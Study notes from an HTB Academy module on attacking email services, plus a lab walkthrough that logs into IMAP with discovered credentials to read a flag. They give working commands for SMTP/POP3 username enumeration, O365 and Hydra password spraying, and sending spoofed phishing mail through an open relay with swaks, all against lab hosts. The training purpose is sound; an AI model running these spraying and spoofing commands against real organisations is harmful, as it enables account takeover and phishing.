# Attacking Email Services

**Module:** HTB Academy – Attacking Email Services

---

## Mail Server Basics

- **Mail server:** handles/delivers email over a network — receives from clients, sends to other mail servers, delivers to clients.
- **Client:** where you read email (desktop/mobile app).

### Protocols

| Protocol | Purpose |
|---|---|
| **SMTP** (Simple Mail Transfer Protocol) | Client → server, and server → server delivery |
| **POP3** | Client downloads mail from a server mailbox |
| **IMAP4** | Client syncs mail with a server mailbox |

- **POP3 default behavior:** removes messages from server after download → hard to access the same mailbox from multiple devices (can be configured to keep server copies).
- **IMAP4 default behavior:** does **not** remove messages from server → easy multi-device access.

**Flow:** Client → SMTP → Server → SMTP → Server → IMAP → Client (retrieval).

## Enumeration

- Email infrastructure is complex — many servers/ports/services to enumerate.
- Many companies use **cloud email** (Microsoft 365, G-Suite) instead of self-hosted — approach differs per provider.

### MX Record Lookup

MX (Mail eXchanger) DNS record identifies the mail server(s) responsible for a domain. Multiple MX records = load balancing/redundancy.

```bash
host -t MX hackthebox.eu
# hackthebox.eu mail is handled by 1 aspmx.l.google.com.     → G-Suite

host -t MX microsoft.com
# mail is handled by 10 microsoft-com.mail.protection.outlook.com.   → Microsoft 365

dig mx plaintext.do | grep "MX" | grep -v ";"
# → mx.zoho.com, mx2.zoho.com, mx3.zoho.com   → Zoho

dig mx inlanefreight.com | grep "MX" | grep -v ";"
# → mail1.inlanefreight.com    → likely custom/self-hosted

host -t A mail1.inlanefreight.htb.
# → resolves to an IP → custom server to target directly
```

- Cloud providers use proprietary implementations + modern auth → unique attack vectors per provider.
- Self-hosted/custom servers → more likely to have **misconfigurations** and classic protocol-level weaknesses.

### Custom Mail Server — Ports to Enumerate

| Port | Service |
|---|---|
| TCP/25 | SMTP (unencrypted) |
| TCP/143 | IMAP4 (unencrypted) |
| TCP/110 | POP3 (unencrypted) |
| TCP/465 | SMTP (encrypted) |
| TCP/587 | SMTP (encrypted/STARTTLS) |
| TCP/993 | IMAP4 (encrypted) |
| TCP/995 | POP3 (encrypted) |

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

- Nmap default scripts (`-sC`) enumerate banners/capabilities, e.g. Postfix SMTP commands supported (`PIPELINING`, `VRFY`, `ETRN`, `8BITMIME`, etc.).

## Misconfigurations — Authentication / Username Enumeration

Several SMTP commands can leak valid usernames:

### `VRFY`
- Asks the server to verify if a username/mailbox exists. Can be disabled.

```
VRFY root        → 252 2.0.0 root            (exists)
VRFY www-data    → 252 2.0.0 www-data         (exists)
VRFY new-user    → 550 ... Recipient address rejected: User unknown
```

### `EXPN`
- Like `VRFY`, but for **distribution lists** — expands a list alias into all member addresses. Often riskier (e.g. an "all" alias).

```
EXPN john            → 250 2.1.0 john@inlanefreight.htb
EXPN support-team    → 250 carol@inlanefreight.htb
                        250 elisa@inlanefreight.htb
```

### `RCPT TO`
- Specifies message recipient(s); can be repeated for multiple recipients. Response reveals if the user is known.

```
MAIL FROM:test@htb.com   → 250 Sender ok
RCPT TO:julio             → 550 User unknown
RCPT TO:kate               → 550 User unknown
RCPT TO:john                → 250 Recipient ok
```

### POP3 `USER` Command

```
USER julio   → -ERR
USER john    → +OK
```

- `+OK` response indicates the user exists.

### Automating Enumeration — `smtp-user-enum`

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

- `-M` → mode (`VRFY` / `EXPN` / `RCPT`)
- `-U` → username wordlist
- `-D` → domain (needed for some modes to build email addresses)
- `-t` → target IP

## Cloud Enumeration (Office 365 Example)

- Cloud providers have their own quirks that can be abused for enumeration.
- **O365spray** — username enumeration + password spraying tool for Microsoft 365.

### Validate Domain Uses O365

```bash
python3 o365spray.py --validate --domain msplaintext.xyz
# [VALID] The following domain is using O365: msplaintext.xyz
```

### Enumerate Usernames

```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
# [VALID] lewen@msplaintext.xyz
# [VALID] juurena@msplaintext.xyz
```

## Password Attacks

### Hydra — Generic SMTP/POP3/IMAP4 Spray/Brute

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
# [110][pop3] host: 10.129.42.197  login: john  password: Company01!
```

- `-L` username list, `-p` single password (spray), `-f` stop after first valid find.
- Cloud services often **block generic tools like Hydra** — use provider-specific tools instead:
  - **O365spray** / **MailSniper** → Microsoft 365
  - **CredKing** → Gmail / Okta
- Keep these tools **up to date** — providers frequently change auth flows, breaking older tooling. Understanding what the tool does under the hood lets you patch it yourself if it breaks.

### O365spray — Password Spraying

```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
# [VALID] lewen@msplaintext.xyz:March2022!
```

- `--count` → passwords per spray round
- `--lockout` → minutes to wait between rounds (avoid triggering lockout policies)

## Protocol-Specific Attacks — Open Relay

- **Open relay:** misconfigured SMTP server that relays mail from/to **any** source without authentication.
- Masks the true origin of a message — looks like it came from the relay server itself.
- **Attack use case:** phishing — spoof a trusted internal sender address to deliver convincing phishing emails to employees.

### Detecting an Open Relay

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
# |_smtp-open-relay: Server is an open relay (14/16 tests)
```

### Exploiting an Open Relay — `swaks`

```bash
swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Hi All, ... http://mycustomphishinglink.com/' \
      --server 10.10.11.213
```

- Server accepts `MAIL FROM` / `RCPT TO` with **no authentication** and relays the spoofed message → delivered as if from `notifications@inlanefreight.com`.

## Key Takeaways

- Start with **MX record enumeration** to identify whether the target uses cloud email or a custom server — this decides your whole approach.
- Custom servers: enumerate the standard SMTP/POP3/IMAP4 ports (plain + encrypted variants).
- `VRFY`, `EXPN`, `RCPT TO`, and POP3 `USER` are classic username-enumeration vectors — differing response codes reveal valid vs. invalid users.
- Automate with `smtp-user-enum`; for cloud (O365, Gmail, Okta) use provider-specific tools (`o365spray`, `MailSniper`, `CredKing`) since generic brute-forcers are usually blocked.
- **Open relay** misconfigurations enable unauthenticated spoofed mail — a strong phishing/social-engineering vector — detectable via Nmap's `smtp-open-relay` script and exploitable with `swaks`.

# IMAP Enumeration – Accessing Email and Retrieving the Flag

## Objective

Access the user's email account using the discovered credentials and retrieve the flag from the email stored in the mailbox.

## 1. Identify the IMAP Service

After enumerating the target, IMAP was found running on **TCP port 143**.

```bash
nc -nv 10.129.203.12 143
```

The server responded:

```text
* OK IMAPrev1
```

This confirmed that an IMAP service was available.

## 2. Log in to the Mailbox

The discovered credentials were:

```text
Username: marlin
Password: poohbear
```

Because IMAP expects CRLF line endings, `nc -C` was used:

```bash
nc -nvC 10.129.203.12 143
```

Then authenticate:

```text
a1 LOGIN marlin poohbear
```

A successful login allows further IMAP commands.

## 3. Enumerate the Mailboxes

List the available mailboxes:

```text
a2 LIST "" "*"
```

The server returned:

```text
* LIST (\HasNoChildren) "." "INBOX"
a2 OK LIST completed
```

This confirmed that the user had an **INBOX** mailbox.

## 4. Select the Inbox

Select the mailbox:

```text
a3 SELECT INBOX
```

The server returned:

```text
* 1 EXISTS
* 1 RECENT
...
a3 OK [READ-WRITE] SELECT completed
```

The important line was:

```text
* 1 EXISTS
```

This means there was **one email message** in the inbox.

## 5. Retrieve the Email

Since there was only one message, retrieve message number `1`:

```text
a4 FETCH 1 BODY[]
```

This returned the complete contents of the email.

The email contained the required **flag**, which was submitted as the answer.

## Command Flow

The complete process was:

```text
Connect to IMAP
      ↓
Authenticate with discovered credentials
      ↓
LIST mailboxes
      ↓
SELECT INBOX
      ↓
Check number of emails
      ↓
FETCH email
      ↓
Read the flag
```

## Useful IMAP Commands

List mailboxes:

```text
a2 LIST "" "*"
```

Select inbox:

```text
a3 SELECT INBOX
```

Search all messages:

```text
a4 SEARCH ALL
```

Read message 1:

```text
a5 FETCH 1 BODY[]
```

Read only the headers:

```text
a5 FETCH 1 BODY.PEEK[HEADER]
```

## Key Takeaway

When valid email credentials are discovered, **SMTP is primarily used for sending mail**, while **IMAP can be used to access and read the mailbox**. In this case, port `143` provided IMAP access, allowing the inbox to be selected and the email containing the flag to be retrieved.
